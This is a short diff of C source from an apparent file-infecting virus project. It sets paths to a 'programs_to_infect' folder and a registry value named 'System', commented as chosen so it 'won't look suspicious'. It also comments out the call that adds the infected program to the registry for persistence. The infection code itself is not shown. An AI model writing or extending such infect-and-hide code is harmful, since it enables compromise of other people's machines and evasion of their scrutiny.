@@ -32,7 +32,7 @@
 // path to my own program that pops up message box.
 #define MSGBOX_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\msgBox.exe"
 #define NOTEPAD_PLUS_PLUS_PATH "C:\\Program Files (x86)\\Notepad++\\notepad++.exe"
-#define SEARCH_FROM_THERE_DIRECTORY "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect"	
+#define SEARCH_FROM_THERE_DIRECTORY "..\\programs_to_infect"	
 
 // Values for the registry
 #define VALUE_NAME "System" // won't look suspicious
@@ -50,8 +50,9 @@ int main()
 		return ERROR;
 	printf("%s is suitable \nstart infecting\n", infected_path);
 	result = infect(infected_path);
-	if (result == SUCCESS)
-		add_to_registry(infected_path);
+	//if (result == SUCCESS)
+	//	add_to_registry(infected_path);
+	return result;
 }
 
 int add_to_registry(char* path_to_exe)
